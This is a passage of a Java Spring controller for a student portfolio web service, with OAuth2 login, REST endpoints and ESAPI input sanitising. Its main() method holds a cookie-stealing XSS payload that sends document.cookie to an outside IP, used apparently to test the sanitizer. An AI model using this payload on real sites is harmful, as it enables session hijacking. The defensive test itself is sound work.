/*******************************************************************************
 * Copyright 2012-2013 Trento RISE
 * 
 *    Licensed under the Apache License, Version 2.0 (the "License");
 *    you may not use this file except in compliance with the License.
 *    You may obtain a copy of the License at
 * 
 *        http://www.apache.org/licenses/LICENSE-2.0
 * 
 *    Unless required by applicable law or agreed to in writing, software
 *    distributed under the License is distributed on an "AS IS" BASIS,
 *    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *    See the License for the specific language governing permissions and
 *    limitations under the License.
 ******************************************************************************/
package eu.trentorise.smartcampus.portfolio.controller.rest;

import it.sayservice.platform.client.DomainObject;
import it.sayservice.platform.client.InvocationException;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.ServletInputStream;
import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang.StringEscapeUtils;
import org.apache.log4j.Logger;
import org.codehaus.jackson.map.ObjectMapper;
import org.owasp.esapi.ESAPI;
import org.owasp.esapi.Validator;
import org.owasp.esapi.errors.IntrusionException;
import org.owasp.esapi.errors.ValidationException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.authentication.preauth.PreAuthenticatedAuthenticationToken;
import org.springframework.security.web.context.HttpSessionSecurityContextRepository;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

import eu.trentorise.smartcampus.aac.AACException;
import eu.trentorise.smartcampus.portfolio.data.PmBasicProfile;
import eu.trentorise.smartcampus.portfolio.manager.PortfolioManager;
import eu.trentorise.smartcampus.portfolio.models.Portfolio;
import eu.trentorise.smartcampus.portfolio.models.SharedPortfolioContainer;
import eu.trentorise.smartcampus.portfolio.models.StudentData;
import eu.trentorise.smartcampus.portfolio.models.StudentExams;
import eu.trentorise.smartcampus.portfolio.models.StudentInfo;
import eu.trentorise.smartcampus.portfolio.models.UserData;
import eu.trentorise.smartcampus.portfolio.models.UserProducedData;
import eu.trentorise.smartcampus.portfolio.util.PortfolioUtils;
import eu.trentorise.smartcampus.presentation.common.exception.DataException;
import eu.trentorise.smartcampus.presentation.common.exception.NotFoundException;
import eu.trentorise.smartcampus.presentation.common.util.Util;
import eu.trentorise.smartcampus.presentation.storage.BasicObjectStorage;
import eu.trentorise.smartcampus.profileservice.model.BasicProfile;

@Controller
public class PortfolioController extends SCController {

	private static final String PROFILE_UNITN = "unitn";
	private static final String ATTRIBUTE_IDADA = "idada";

	@Autowired
	private PortfolioManager portfolioManager;

	@Autowired
	private BasicObjectStorage storage;

	@Autowired
	private AuthenticationManager authenticationManager;

	@Autowired
	@Value("${smartcampus.portfoliomanager.url}")
	private String mainURL;

	@Autowired
	@Value("${smartcampus.vas.communitymanager.uri}")
	private String profileServiceUri;

	private Validator validator = ESAPI.validator();
	private static final int INPUT_MAX_LENGTH = 9999;

	private Logger log = Logger.getLogger(this.getClass());

	/*
	 * OAUTH2
	 */
	@RequestMapping(method = RequestMethod.GET, value = "/")
	public ModelAndView index(HttpServletRequest request) {
		Map<String, Object> model = new HashMap<String, Object>();
		model.put("token", getToken(request));
		return new ModelAndView("index", model);
	}

	@RequestMapping(method = RequestMethod.GET, value = "/check")
	public ModelAndView securePage(HttpServletRequest request, @RequestParam(required = false) String code)
			throws SecurityException, AACException {
		String redirectUri = mainURL + "/check";
		String userToken = aacService.exchngeCodeForToken(code, redirectUri).getAccess_token();
		List<GrantedAuthority> list = Collections.<GrantedAuthority> singletonList(new SimpleGrantedAuthority("ROLE_USER"));
		Authentication auth = new PreAuthenticatedAuthenticationToken(userToken, "", list);
		auth = authenticationManager.authenticate(auth);
		SecurityContextHolder.getContext().setAuthentication(auth);
		request.getSession().setAttribute(HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY,
				SecurityContextHolder.getContext());
		return new ModelAndView("redirect:/");
	}

	@RequestMapping(method = RequestMethod.GET, value = "/login")
	public ModelAndView secure(HttpServletRequest request) {
		String redirectUri = mainURL + "/check";
		return new ModelAndView(
				"redirect:"
						+ aacService.generateAuthorizationURIForCodeFlow(redirectUri, null,
								"smartcampus.profile.basicprofile.me", null));
	}

	/*
	 * STUDENT PERSONAL DATA FROM ADA
	 */
	@RequestMapping(method = RequestMethod.POST, value = "/rest/createstudent")
	public @ResponseBody
	Boolean createStudent(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return null;
			}

			String unitnId = getAccountProfile(request).getAttribute(PROFILE_UNITN, ATTRIBUTE_IDADA);

			if (unitnId == null) {
				return false;
			}

			portfolioManager.createStudent(userId, unitnId);
			return true;
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return null;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.StudentInfo")
	public @ResponseBody
	String getStudentInfo(HttpServletRequest request, HttpServletResponse response) throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			return portfolioManager.getStudentInfo(userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.StudentExams")
	public @ResponseBody
	String getStudentExams(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			return portfolioManager.getStudentExams(userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	// PORTFOLIOS

	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.Portfolio")
	public @ResponseBody
	String getStudentPortfolios(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		return PortfolioUtils.listToJSON(getStudentPortfoliosList(request, response));
	}

	private List<String> getStudentPortfoliosList(HttpServletRequest request, HttpServletResponse response) {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return null;
			}

			return portfolioManager.getStudentPortfolios(userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
			return null;
		}
	}

	@RequestMapping(method = RequestMethod.POST, value = "/rest/smartcampus.services.esse3.Portfolio")
	public @ResponseBody
	String createPortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			Portfolio portfolio = (Portfolio) extractContent(request, Portfolio.class);
			portfolio = sanitize(portfolio);
			return portfolioManager.createPortfolio(portfolio, userId, Long.valueOf(getBasicProfile(request).getSocialId()));
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.PUT, value = "/rest/smartcampus.services.esse3.Portfolio/{id}")
	public @ResponseBody
	String updatePortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			Portfolio portfolio = (Portfolio) extractContent(request, Portfolio.class);
			portfolio = sanitize(portfolio);
			portfolioManager.updatePortfolio(portfolio, id, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.DELETE, value = "/rest/smartcampus.services.esse3.Portfolio/{id}")
	public @ResponseBody
	String deletePortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}
			portfolioManager.deletePortfolio(id, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	/*
	 * USER PRODUCED DATA
	 */
	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.UserProducedData")
	public @ResponseBody
	String getUserProducedDataAll(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws IOException, InvocationException {
		return PortfolioUtils.listToJSON(getUserProducedDataList(request, response, null));
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.UserProducedData/{category}")
	public @ResponseBody
	String getUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String category) throws IOException, InvocationException {
		return PortfolioUtils.listToJSON(getUserProducedDataList(request, response, category));
	}

	private List<String> getUserProducedDataList(HttpServletRequest request, HttpServletResponse response, String category) {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return null;
			}
			return portfolioManager.getUserProducedData(userId, category);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
			return null;
		}
	}

	@RequestMapping(method = RequestMethod.POST, value = "/rest/smartcampus.services.esse3.UserProducedData")
	public @ResponseBody
	String createUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			UserProducedData upd = (UserProducedData) extractContent(request, UserProducedData.class);
			upd = sanitize(upd);
			portfolioManager.createUserProducedData(upd, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.PUT, value = "/rest/smartcampus.services.esse3.UserProducedData/{id}")
	public @ResponseBody
	String updateUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			UserProducedData upd = (UserProducedData) extractContent(request, UserProducedData.class);
			upd = sanitize(upd);
			portfolioManager.updateUserProducedData(upd, id, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.DELETE, value = "/rest/smartcampus.services.esse3.UserProducedData/{id}")
	public @ResponseBody
	String deleteUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}
			portfolioManager.deleteUserProducedData(id, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	// GENERIC OBJECT
	@RequestMapping(method = RequestMethod.GET, value = "/rest/object/{id}/{type}")
	public @ResponseBody
	String getObjectById(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id, @PathVariable String type) throws IOException, InvocationException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// return domainClient.searchDomainObject(type, id,
			// "vas_portfolio_subscriber");
			String result = portfolioManager.getDomainObject(type, id);
			if (result != null) {
				DomainObject o = new DomainObject(result);
				if (!userId.equals(o.getContent().get("userId"))) {
					throw new SecurityException("Incorrect user");
				}
			}
			return result;
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	// USER PROFILE
	@RequestMapping(method = RequestMethod.GET, value = "/rest/getprofile")
	public @ResponseBody
	PmBasicProfile getProfile(HttpServletRequest request, HttpServletResponse response, HttpSession session) throws Exception {
		PmBasicProfile basicProfile = getProfileData(request, response);
		return basicProfile;
	}

	private PmBasicProfile getProfileData(HttpServletRequest request, HttpServletResponse response) throws Exception {
		BasicProfile basicProfile = getBasicProfile(request);
		PmBasicProfile pmb = new PmBasicProfile(basicProfile);

		String unitnId = getAccountProfile(request).getAttribute(PROFILE_UNITN, ATTRIBUTE_IDADA);

		if (unitnId != null) {
			pmb.setStudent(true);
			String studentInfo = portfolioManager.getStudentInfo(basicProfile.getUserId());
			if (studentInfo == null || studentInfo.isEmpty()) {
				portfolioManager.createStudent(basicProfile.getUserId(), unitnId);
			}
		}

		return pmb;
	}

	// @RequestMapping(method = RequestMethod.POST, value =
	// "/rest/createprofile")
	// public @ResponseBody
	// void createProfile(HttpServletRequest request, HttpServletResponse
	// response, HttpSession session)
	// throws InvocationException {
	// try {
	// String userId = getBasicProfile(request).getUserId();
	// if (userId == null) {
	// response.setStatus(HttpServletResponse.SC_FORBIDDEN);
	// }
	//
	// Map<String, Object> json = (Map<String, Object>) extractContent(request,
	// Map.class);
	// if (json.containsKey("name") && json.containsKey("surname")) {
	// ObjectMapper mapper = new ObjectMapper();
	// json.put("userId", userId);
	// profileManager.createProfile(getToken(request),
	// mapper.writeValueAsString(json), profileServiceUri);
	// } else {
	// response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
	// }
	//
	// } catch (Exception e) {
	// response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
	// }
	// }

	/*
	 * Utils, Getters and Setters
	 */
	@SuppressWarnings("unused")
	private String extractContentAsString(ServletRequest request) throws IOException {
		ServletInputStream sis = request.getInputStream();
		int c;
		String s = "";
		while ((c = sis.read()) != -1) {
			s += (char) c;
		}
		return s;
	}

	private Object extractContent(ServletRequest request, Class<?> clz) {
		try {
			ServletInputStream sis = request.getInputStream();
			ObjectMapper mapper = new ObjectMapper();
			Object obj = mapper.readValue(sis, clz);
			return obj;
		} catch (Exception e) {
			log.error("Error converting request to " + clz.getName());
		}
		return null;
	}

	private String sanitize(String s) throws ValidationException, IntrusionException {
		s = validator.getValidSafeHTML("string", s, INPUT_MAX_LENGTH, true);
		s = StringEscapeUtils.unescapeHtml(s);
		return s;
	}

	public static void main(String[] args) throws ValidationException, IntrusionException {
		String s = ESAPI.validator().getValidSafeHTML("string",
				"<A HREF=\"javascript:document.location='http://66.102.7.147/'+document.cookie\">XSS</A>", INPUT_MAX_LENGTH,
				true);
		s = StringEscapeUtils.unescapeHtml(s);
		System.err.println(s);
	}

	private UserProducedData sanitize(UserProducedData upd) throws ValidationException, IntrusionException {
		if (!upd.getTitle().isEmpty()) {
			upd.setTitle(sanitize(upd.getTitle()));
		}
		if (!upd.getSubtitle().isEmpty()) {
			upd.setSubtitle(sanitize(upd.getSubtitle()));
		}
		if (!upd.getContent().isEmpty()) {
			upd.setContent(sanitize(upd.getContent()));
		}
		return upd;
	}

	private UserData sanitize(UserData userdata) throws ValidationException, IntrusionException {
		if (!userdata.getNotes().isEmpty()) {
			userdata.setNotes(sanitize(userdata.getNotes()));
		}
		return userdata;
	}

	private Portfolio sanitize(Portfolio portfolio) throws ValidationException, IntrusionException {
		if (!portfolio.getName().isEmpty()) {
			portfolio.setName(sanitize(portfolio.getName()));
		}

		List<String> list;

		// showUserGeneratedData
		if (portfolio.getShowUserGeneratedData() != null && !portfolio.getShowUserGeneratedData().isEmpty()) {
			list = new ArrayList<String>();
			for (String s : portfolio.getShowUserGeneratedData()) {
				s = sanitize(s);
				if (s != null && !s.isEmpty()) {
					list.add(s);
				}
			}
			portfolio.setShowUserGeneratedData(list);
		}

		// highlightUserGeneratedData
		if (portfolio.getHighlightUserGeneratedData() != null && !portfolio.getHighlightUserGeneratedData().isEmpty()) {
			list = new ArrayList<String>();
			for (String s : portfolio.getHighlightUserGeneratedData()) {
				s = sanitize(s);
				if (s != null && !s.isEmpty()) {
					list.add(s);
				}
			}
			portfolio.setHighlightUserGeneratedData(list);
		}

		// showStudentInfo
		if (portfolio.getShowStudentInfo() != null && !portfolio.getShowStudentInfo().isEmpty()) {
			list = new ArrayList<String>();
			for (String s : portfolio.getShowStudentInfo()) {
				s = sanitize(s);
				if (s != null && !s.isEmpty()) {
					list.add(s);
				}
			}
			portfolio.setShowStudentInfo(list);
		}

		return portfolio;
	}

	/*
	 * Methods for mobile's RemoteStorage
	 */
	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.StudentInfo")
	public @ResponseBody
	List<StudentInfo> getStudentInfo_Remote(HttpServletRequest request, HttpServletResponse response) throws Exception {
		StudentInfo si = new StudentInfo();

		String studentInfo = getStudentInfo(request, response);
		if (studentInfo != null && !studentInfo.isEmpty()) {
			DomainObject obj = new DomainObject(studentInfo);
			si = PortfolioUtils.convert(obj.getContent(), StudentInfo.class);
			si.setId(obj.getId());
		} else {
			si.setUserId(getBasicProfile(request).getUserId());
		}

		BasicProfile basicProfile = getBasicProfile(request);
		if (basicProfile != null) {
			StudentData sd = si.getStudentData();
			if (sd == null) {
				sd = new StudentData();
				si.setStudentData(sd);
			}
			sd.setName((String) basicProfile.getName());
			sd.setSurname((String) basicProfile.getSurname());
		}

		return Collections.singletonList(si);
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.StudentExams")
	public @ResponseBody
	List<StudentExams> getStudentExams_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws Exception {
		List<StudentExams> seList = new ArrayList<StudentExams>();
		String seString = getStudentExams(request, response, session);

		if (seString != null && !seString.isEmpty()) {
			DomainObject obj = new DomainObject(seString);
			StudentExams p = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
			p.setId(obj.getId());
			seList.add(p);
		}

		return seList;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.UserProducedData")
	public @ResponseBody
	List<UserProducedData> getUserProducedDataAll_Remote(HttpServletRequest request, HttpServletResponse response,
			HttpSession session) throws Exception {
		List<UserProducedData> updList = new ArrayList<UserProducedData>();
		List<String> list = getUserProducedDataList(request, response, null);

		if (list != null) {
			for (String s : list) {
				DomainObject obj = new DomainObject(s);
				UserProducedData p = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
				p.setId(obj.getId());
				updList.add(p);
			}
		}

		return updList;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio")
	public @ResponseBody
	List<Portfolio> getStudentPortfolios_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws Exception {
		List<Portfolio> portfoliosList = new ArrayList<Portfolio>();
		List<String> list = getStudentPortfoliosList(request, response);

		if (list != null) {
			for (String s : list) {
				DomainObject obj = new DomainObject(s);
				Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
				p.setId(obj.getId());
				portfoliosList.add(p);
			}
		}

		return portfoliosList;
	}

	@RequestMapping(method = RequestMethod.POST, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio")
	public @ResponseBody
	Portfolio createPortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws Exception {
		Portfolio portfolio = null;
		String portfolioString = createPortfolio(request, response, session);

		if (portfolioString != null && !portfolioString.isEmpty()) {
			DomainObject obj = new DomainObject(portfolioString);
			portfolio = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
			portfolio.setId(obj.getId());
		}

		return portfolio;
	}

	@RequestMapping(method = RequestMethod.PUT, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio/{id}")
	public @ResponseBody
	String updatePortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		return updatePortfolio(request, response, session, id);
	}

	@RequestMapping(method = RequestMethod.DELETE, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio/{id}")
	public @ResponseBody
	String deletePortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		return deletePortfolio(request, response, session, id);
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.UserData")
	public @ResponseBody
	List<UserData> getUserData(HttpServletRequest request, HttpServletResponse response) throws DataException,
			NotFoundException {
		String userId = getBasicProfile(request).getUserId();
		if (userId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}
		UserData data;
		try {
			data = storage.getObjectById(userId, UserData.class);
		} catch (NotFoundException e) {
			data = new UserData();
			data.setId(userId);
			data.setUser(userId);
			storage.storeObject(data);
		}
		return Collections.singletonList(data);

	}

	@RequestMapping(method = RequestMethod.PUT, value = "/rest/eu.trentorise.smartcampus.portfolio.models.UserData/{id}")
	public @ResponseBody
	UserData updateUserData(HttpServletRequest request, HttpServletResponse response, @PathVariable String id,
			@RequestBody Map<String, Object> obj) throws DataException {
		try {
			String userId = getBasicProfile(request).getUserId();
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return null;
			}
			UserData data = Util.convert(obj, UserData.class);
			data = sanitize(data);
			data.setUser(userId);
			data.setId(userId);
			storage.storeObject(data);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}

		return null;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio/entity/{entityId}")
	public @ResponseBody
	Portfolio getPortfolioByEntityId(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable Long entityId) throws Exception {

		// check the current user
		String currentUserId = getBasicProfile(request).getUserId();
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getPortfolioByEntityId(entityId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
		p.setId(obj.getId());

		// check if can access portfolio
		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}
		return p;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.StudentInfo/portfolio/{portfolioId}")
	public @ResponseBody
	StudentInfo getStudentInfoByPortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String portfolioId) throws Exception {
		StudentInfo si = new StudentInfo();

		// check the current user
		String currentUserId = getBasicProfile(request).getUserId();
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);

		// check if can access portfolio
		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		List<StudentInfo> list = getStudentInfo_Remote(request, response);
		if (list != null && list.isEmpty()) {
			si = list.get(0);
		} else {
			BasicProfile basicProfile = getBasicProfile(request);
			if (basicProfile != null) {
				StudentData sd = si.getStudentData();
				if (sd == null) {
					sd = new StudentData();
					si.setStudentData(sd);
				}
				sd.setName(basicProfile.getName());
				sd.setSurname(basicProfile.getSurname());
			}
			return si;
		}

		if (p.getUserId().equals(currentUserId)) {
			return si;
		} else {
			// filter student info
			List<String> showInfo = p.getShowStudentInfo();
			si.getStudentData().filterData(showInfo);
		}

		return si;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.StudentExams/portfolio/{portfolioId}")
	public @ResponseBody
	List<StudentExams> getStudentExamsByPortfolio(HttpServletRequest request, HttpServletResponse response,
			HttpSession session, @PathVariable String portfolioId) throws Exception {
		List<StudentExams> seList = new ArrayList<StudentExams>();

		// check the current user
		String currentUserId = getBasicProfile(request).getUserId();
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);

		// check if can access portfolio
		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		List<String> udList = p.getShowUserGeneratedData();
		// if no data is shared, neither the student exams are
		if (udList == null || udList.isEmpty())
			return null;

		String userId = p.getUserId();
		String updString = portfolioManager.getUserUNITNData(userId);
		if (updString == null)
			return null;
		obj = new DomainObject(updString);
		UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
		upd.setId(obj.getId());

		if (!udList.contains(obj.getId())) {
			return null;
		}

		String seString = portfolioManager.getStudentExams(userId);

		if (seString != null && !seString.isEmpty()) {
			obj = new DomainObject(seString);
			StudentExams se = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
			se.setId(obj.getId());
			seList.add(se);
		}

		return seList;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.UserProducedData/portfolio/{portfolioId}")
	public @ResponseBody
	List<UserProducedData> getUserProducedDataByPortfolio(HttpServletRequest request, HttpServletResponse response,
			@PathVariable String portfolioId) throws Exception {
		List<UserProducedData> updList = new ArrayList<UserProducedData>();
		// List<String> list = getUserProducedDataList(request, response, null);

		// check the current user
		String currentUserId = getBasicProfile(request).getUserId();
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);

		// check if can access portfolio
		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		List<String> udList = p.getShowUserGeneratedData();
		// if no data is shared, neither the student exams are
		if (udList == null || udList.isEmpty())
			return null;

		if (udList != null) {
			for (String s : udList) {
				String updString = portfolioManager.getUserProducedData(s);
				obj = new DomainObject(updString);
				UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
				upd.setId(obj.getId());
				updList.add(upd);
			}
		}

		return updList;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.SharedPortfolioContainer/{entityId}")
	public @ResponseBody
	SharedPortfolioContainer getSharedPortfolio(HttpServletRequest request, HttpServletResponse response,
			@PathVariable Long entityId) throws Exception {
		// check the current user
		String currentUserId = getBasicProfile(request).getUserId();
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getPortfolioByEntityId(entityId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
		p.setId(obj.getId());

		// check if can access portfolio
		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		SharedPortfolioContainer container = new SharedPortfolioContainer();
		container.setPortfolio(p);

		StudentInfo si = null;

		String siString = portfolioManager.getStudentInfo(p.getUserId());
		if (siString != null && !siString.isEmpty()) {
			DomainObject siObj = new DomainObject(siString);
			si = PortfolioUtils.convert(siObj.getContent(), StudentInfo.class);
			si.setId(obj.getId());
		} else {
			si = new StudentInfo();
			si.setStudentData(new StudentData());
		}
		if (!p.getUserId().equals(currentUserId)) {
			List<String> shown = p.getShowStudentInfo();
			si.getStudentData().filterData(shown);
		}
		container.setStudentInfo(si);

		BasicProfile basicProfile = getBasicProfile(request);
		if (basicProfile != null) {
			StudentData sd = container.getStudentInfo().getStudentData();
			sd.setName(basicProfile.getName());
			sd.setSurname(basicProfile.getSurname());
		}

		List<String> udList = p.getShowUserGeneratedData();
		// if no data is shared, neither the student exams are
		if (udList == null || udList.isEmpty())
			return null;

		ArrayList<UserProducedData> updList = new ArrayList<UserProducedData>();
		boolean showExams = false;
		if (udList != null) {
			List<String> all = portfolioManager.getAllUserProducedData(p.getUserId());
			for (String s : all) {
				obj = new DomainObject(s);
